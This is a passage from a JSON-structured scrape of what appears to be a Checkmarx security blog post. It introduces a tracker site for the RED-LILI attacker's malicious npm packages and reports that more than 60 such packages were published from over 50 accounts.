                    "html": "<p id=\"breadcrumbs\"><a href=\"https://checkmarx.com/\">Home</a> \u00bb Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x8bd149d7>",
            "title": "RED-LILI Tracker",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xa63476ec>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x22c7c3a1>": "https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fmalicious&trk=public_post_share-update_update-text",
                        "<a_0xaec7882e>": "https://red-lili.info",
                        "<a_0xde3df75e>": "https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fopensource&trk=public_post_share-update_update-text"
                    },
                    "text": "To keep track of RED-LILI as they deliver more malicious packages, our research team has launched RED-LILI Tracker (https://red-lili.info) - an open source mini-project tracking the attacker's packages over time, while sharing analysis findings.",
                    "html": "<p>To keep track of RED-LILI as they deliver more <a href=\"https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fmalicious&amp;trk=public_post_share-update_update-text\" rel=\"noreferrer noopener\" target=\"_blank\">malicious</a> packages, our research team has launched RED-LILI Tracker (<a href=\"https://red-lili.info\" rel=\"noreferrer noopener\" target=\"_blank\">https://red-lili.info</a>) - an <a href=\"https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fopensource&amp;trk=public_post_share-update_update-text\" rel=\"noreferrer noopener\" target=\"_blank\">open source</a> mini-project tracking the attacker's packages over time, while sharing analysis findings.</p>"
                },
                {
                    "id": "<sentence_0xd46ff206>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xad247a45>": "https://checkmarx.com/wp-content/uploads/2022/04/image_1-969x1024.png"
                    },
                    "text": "",
                    "html": "<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-75561\" height=\"1024\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/image_1-969x1024.png\" width=\"969\"/></figure>"
                },
                {
                    "id": "<sentence_0x1cb01cea>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://red-lili.info website",
                    "html": "<p class=\"has-text-align-center\">https://red-lili.info website</p>"
                },
                {
                    "id": "<sentence_0x7dad1b41>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x2599a7ca>": "https://checkmarx.com/wp-content/uploads/2022/04/image_2.png"
                    },
                    "text": "",
                    "html": "<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-75562\" height=\"556\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/image_2.png\" width=\"995\"/></figure>"
                },
                {
                    "id": "<sentence_0x78ffa2ca>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://red-lili.info package details",
                    "html": "<p class=\"has-text-align-center\">https://red-lili.info package details</p>"
                },
                {
                    "id": "<sentence_0xcbb4fde1>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd513efd4>": "https://checkmarx.com/blog/a-beautiful-factory-for-malicious-packages/"
                    },
                    "text": "RED-LILI has continued to publish packages similar to the ones we described in our previous blog. Since then, they published more than 60 malicious packages from over 50 unique accounts. This automated behavior has subsided recently and cleared the way for several changes. In this blog, we describe our new observations regarding this attackers TTPs.",
                    "html": "<p>RED-LILI has continued to publish packages similar to the ones we described in our <a href=\"https://checkmarx.com/blog/a-beautiful-factory-for-malicious-packages/\">previous blog</a>. Since then, they published more than 60 malicious packages from over 50 unique accounts. This automated behavior has subsided recently and cleared the way for several changes. In this blog, we describe our new observations regarding this attacker\u2019s TTPs.</p>"
                }
            ]
        }
    ]
}